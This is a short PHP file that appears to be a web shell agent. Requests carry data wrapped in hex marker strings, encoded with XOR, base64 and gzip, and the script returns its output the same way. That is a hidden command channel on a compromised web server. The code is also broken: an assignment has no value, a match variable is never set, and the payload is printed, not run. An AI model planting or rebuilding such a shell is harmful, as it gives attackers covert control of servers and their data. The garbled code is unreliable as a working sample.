<?php
$k="e10adc39";
$kh="49ba59abbe56";
$kf="e057f20f883e";
$p="vkzJl2VQbzhPhLHS";
$input = 
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }   
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/",$input)==1) 
    {@ob_start();
        print(@gzuncompress(@x(@base64_decode($m[1]),$k)));
        $o=@ob_get_contents();
        @ob_end_clean();
        $r=@base64_encode(@x(@gzcompress($o),$k));
        print("$p$kh$r$kf");}
?>
